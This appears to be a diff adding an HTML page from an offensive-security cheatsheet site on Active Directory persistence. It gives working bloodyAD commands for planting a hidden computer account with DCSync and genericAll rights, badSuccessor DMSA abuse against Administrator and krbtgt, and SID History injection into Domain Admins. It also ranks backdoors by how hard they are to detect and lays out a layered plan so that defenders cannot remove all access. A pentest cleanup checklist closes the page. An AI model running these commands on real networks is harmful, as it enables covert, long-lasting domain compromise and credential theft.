+    <a class="heading-permalink" href="#xii-computer-account-persistence" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Any domain user can create up to 10 computer accounts (MachineAccountQuota=10 default). Use this to create a hidden RBCD-ready computer:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u Administrator -p <span class="nv">$ADMINPASS</span> --host <span class="nv">$DC</span> add computer hidden_pc <span class="s1">&#39;CompP@ss!&#39;</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u Administrator -p <span class="nv">$ADMINPASS</span> --host <span class="nv">$DC</span> add dcsync <span class="s1">&#39;hidden_pc$&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Or grant generic write on key targets:</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u Administrator -p <span class="nv">$ADMINPASS</span> --host <span class="nv">$DC</span> add genericAll <span class="s1">&#39;CN=Administrator,CN=Users,DC=corp,DC=local&#39;</span> <span class="s1">&#39;hidden_pc$&#39;</span>
+</span></span></code></pre></div><p>Then forget about the account. Use it months later via PtH or as the source for RBCD attacks.</p>
+<h2 id="xiii-badsuccessor-dmsa-persistence" data-heading-permalink="true"><span class="heading-content">xiii. badSuccessor (DMSA persistence)</span>
+    <a class="heading-permalink" href="#xiii-badsuccessor-dmsa-persistence" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Delegated Managed Service Accounts (DMSAs) inherit privileges from their predecessor. If you can create a DMSA with a high-privilege predecessor (the &ldquo;managed account preceded by link&rdquo;), the DMSA inherits those privileges. bloodyAD wraps the attack:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> add badSuccessor newDMSA <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -t <span class="s2">&#34;CN=Administrator,CN=Users,DC=corp,DC=local&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Multiple targets:</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> add badSuccessor newDMSA <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -t <span class="s2">&#34;CN=Administrator,CN=Users,DC=corp,DC=local&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -t <span class="s2">&#34;CN=krbtgt,CN=Users,DC=corp,DC=local&#34;</span>
+</span></span></code></pre></div><p>Pre-check vulnerability:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> msldap badsuccessor_check
+</span></span></code></pre></div><p>Patched in Windows Server 2025 updates released 2025. Pre-patch DCs remain vulnerable.</p>
+<h2 id="xiv-sid-history-injection" data-heading-permalink="true"><span class="heading-content">xiv. SID History injection</span>
+    <a class="heading-permalink" href="#xiv-sid-history-injection" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>When you have DA in any domain, write a SID into a user&rsquo;s <code>sIDHistory</code>. That user inherits the rights of the SID&rsquo;s owner (typically a privileged group):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Direct LDAP write requires the right ACEs, usually only DA can set sIDHistory</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u Administrator -p <span class="nv">$ADMINPASS</span> --host <span class="nv">$DC</span> <span class="nb">set</span> object <span class="se">\
+</span></span></span><span class="line"><span class="cl">  backup_user sIDHistory -v <span class="s1">&#39;S-1-5-21-AAA-BBB-CCC-512&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Now backup_user is a member of Domain Admins (via SID history) without being in the group</span>
+</span></span></code></pre></div><p>Bypasses group membership audits. Detectable only by direct sIDHistory queries.</p>
+<h2 id="xv-persistence-ranking-durability-vs-detectability" data-heading-permalink="true"><span class="heading-content">xv. Persistence ranking (durability vs detectability)</span>
+    <a class="heading-permalink" href="#xv-persistence-ranking-durability-vs-detectability" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>Mechanism</th>
+          <th>Durability</th>
+          <th>Detectability</th>
+          <th>Use when</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Golden Ticket (krbtgt)</td>
+          <td>High (10 years default)</td>
+          <td>Low if AES, high if RC4</td>
+          <td>After full DA, primary backdoor</td>
+      </tr>
+      <tr>
+          <td>Silver Ticket</td>
+          <td>Per-service</td>
+          <td>Low</td>
+          <td>Need access to ONE specific service</td>
+      </tr>
+      <tr>
+          <td>Diamond Ticket</td>
+          <td>High</td>
+          <td>Lower than golden</td>
+          <td>When MDI / AD ATP in play</td>
+      </tr>
+      <tr>
+          <td>Shadow Credentials</td>
+          <td>High</td>
+          <td>Medium</td>
+          <td>GenericWrite on target, no password change wanted</td>
+      </tr>
+      <tr>
+          <td>DCSync ACE</td>
+          <td>High</td>
+          <td>Low</td>
+          <td>Long-term dumping ability</td>
+      </tr>
+      <tr>
+          <td>AdminSDHolder</td>
+          <td>High</td>
+          <td>High (well-known IOC)</td>
+          <td>Quick DA recovery</td>
+      </tr>
+      <tr>
+          <td>Cert forge (CA key)</td>
+          <td>Very high (cert validity)</td>
+          <td>Low</td>
+          <td>CA compromise gives this for free</td>
+      </tr>
+      <tr>
+          <td>DPAPI Backup Key</td>
+          <td>Permanent</td>
+          <td>Low</td>
+          <td>DPAPI cred harvesting forever</td>
+      </tr>
+      <tr>
+          <td>Skeleton Key</td>
+          <td>Single boot</td>
+          <td>High</td>
+          <td>Specific scenarios only</td>
+      </tr>
+      <tr>
+          <td>Hidden user + ACL</td>
+          <td>Medium</td>
+          <td>Medium</td>
+          <td>Want a &ldquo;normal-looking&rdquo; auth path</td>
+      </tr>
+      <tr>
+          <td>badSuccessor (DMSA)</td>
+          <td>High on unpatched</td>
+          <td>Medium</td>
+          <td>Pre-2025 DC builds</td>
+      </tr>
+      <tr>
+          <td>SID History injection</td>
+          <td>High</td>
+          <td>Low</td>
+          <td>Defender doesn&rsquo;t query sIDHistory</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="xvi-layered-persistence" data-heading-permalink="true"><span class="heading-content">xvi. Layered persistence</span>
+    <a class="heading-permalink" href="#xvi-layered-persistence" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Drop multiple mechanisms so defender remediation of one doesn&rsquo;t kill all access:</p>
+<ol>
+<li>Forge a golden ticket, use it for active operations</li>
+<li>Add DCSync ACE to a controlled account for credential refresh</li>
+<li>Drop shadow credentials on one DA account</li>
+<li>Pull and save the DPAPI domain backup key for cred decryption later</li>
+<li>Forge a long-lived certificate from a compromised CA</li>
+</ol>
+<p>Each is independent. Remediation requires finding all of them.</p>
+<h2 id="xvii-cleanup-checklist" data-heading-permalink="true"><span class="heading-content">xvii. Cleanup checklist</span>
+    <a class="heading-permalink" href="#xvii-cleanup-checklist" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>End-of-engagement (or right after testing persistence works):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u Administrator -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> remove genericAll <span class="se">\
+</span></span></span><span class="line"><span class="cl">  <span class="s2">&#34;CN=AdminSDHolder,CN=System,DC=corp,DC=local&#34;</span> attacker
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u Administrator -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> remove dcsync attacker
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u Administrator -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> remove shadowCredentials Administrator
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u Administrator -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> remove object backup_svc
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u Administrator -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> remove object <span class="s1">&#39;hidden_pc$&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Reset SID history if you set it:</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u Administrator -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> <span class="nb">set</span> object backup_user sIDHistory
+</span></span></code></pre></div><div class="obsidian-callout callout-warning">
+  <div class="obsidian-callout-header">
+    <div class="obsidian-callout-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path>
+          <path d="M12 9v4"></path>
+          <path d="M12 17h.01"></path></svg>
+    </div>
+    <span class="obsidian-callout-title">krbtgt resets</span>
+  </div>
+  <div class="obsidian-callout-body">
+    <p>If you&rsquo;ve forged golden tickets and want to &ldquo;uncompromise&rdquo; the domain, the client must reset krbtgt TWICE with a replication delay between (Microsoft&rsquo;s &ldquo;Reset-KrbtgtKeys.ps1&rdquo; handles this). Document this in your report.</p>
+  </div>
+</div>
+<p>Document every change. Cleanup is part of the engagement, not optional.</p>
+
+        </div>
+
+        
+          <nav class="cheatsheet-pager is-prev-only" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/active-directory/ad13-trust-attacks/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Previous</span>
+              <span class="cheatsheet-pager-title">Trust Attacks</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a></nav>
+        
+      </div>
+    </div>
+  </article>
+  
+
+  </main>
+  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
+    <svg viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M12 18V6"></path>
+      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
+    </svg>
+  </button>
+  <footer class="site-footer">
+  <p>&copy; 2026 JinPwn</p>
+</footer>
+
+</body>
+</html>
